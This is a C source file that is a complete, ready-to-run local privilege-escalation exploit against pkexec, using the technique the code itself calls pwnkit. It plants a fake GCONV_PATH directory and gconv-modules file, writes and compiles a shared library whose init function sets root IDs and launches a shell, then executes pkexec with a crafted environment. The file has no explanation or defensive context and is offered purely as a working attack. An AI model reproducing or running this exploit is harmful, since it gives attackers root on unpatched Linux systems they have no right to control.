#include <sys/stat.h>
#include <sys/types.h>

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>

bool MakeShareLib(){
    //const char ShellPath[] = "/bin/sh";
    const char ShellPath[] = "/bin/bash";
    const char sourceCode[] = 
        "#include <stdio.h>\n"
        "#include <stdlib.h>\n"
        "#include <unistd.h>\n\n"
        "void gconv() {}\n"
        "void gconv_init() {\n"
        "setuid(0); setgid(0);\n"
        "seteuid(0); setegid(0);\n"
        "system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; %s\");\n"
        "exit(0);\n"
        "}\n";

    FILE *fp = fopen("pwnkit/pwnkit.c", "w");
    if(fp != NULL){
        fprintf(fp, sourceCode,ShellPath);
        fclose(fp);
        return 1;
    }
    return 0;
}
bool MakeModule(){
    FILE *fp = fopen("pwnkit/gconv-modules", "w");
    if(fp != NULL){
        fprintf(fp, "module UTF-8// PWNKIT// pwnkit 2");
        fclose(fp);
        return 1;
    }
    return 0;
}

int main(int argc, char *argv[]) {
    mkdir("GCONV_PATH=.", 0700);
    system("touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");

    mkdir("pwnkit", 0700);
    if(MakeModule() && MakeShareLib()){
        char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
        system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
        execve("/usr/bin/pkexec", (char*[]){NULL}, env);
    }
    return 0;
}
